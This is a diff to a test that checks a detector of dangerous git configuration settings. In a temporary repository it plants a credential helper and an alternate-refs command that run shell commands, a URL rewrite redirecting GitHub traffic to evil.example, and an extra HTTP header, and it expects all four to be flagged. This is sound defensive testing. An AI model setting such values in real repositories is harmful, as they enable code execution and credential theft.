@@ -35,9 +35,14 @@ describe("Petrina's own git steps", () => {
     const repo = join(temp, "risky");
     execFileSync("mkdir", ["-p", repo]);
     git(repo, "init", "-q", "-b", "main");
+    git(repo, "remote", "add", "origin", "https://github.com/acme/shop.git");
+    git(repo, "config", "branch.main.remote", "origin");
+    git(repo, "config", "core.hooksPath", ".husky");
     expect(await riskySettings(repo)).toEqual([]);
     git(repo, "config", "credential.helper", "!sh -c 'touch /tmp/stolen'");
     git(repo, "config", "url.https://evil.example/.insteadOf", "https://github.com/");
-    expect(await riskySettings(repo)).toEqual(["credential.helper", "url.https://evil.example/.insteadof"]);
+    git(repo, "config", "http.extraHeader", "X-Leak: 1");
+    git(repo, "config", "core.alternateRefsCommand", "sh -c id");
+    expect((await riskySettings(repo)).sort()).toEqual(["core.alternaterefscommand", "credential.helper", "http.extraheader", "url.https://evil.example/.insteadof"]);
   });
 });
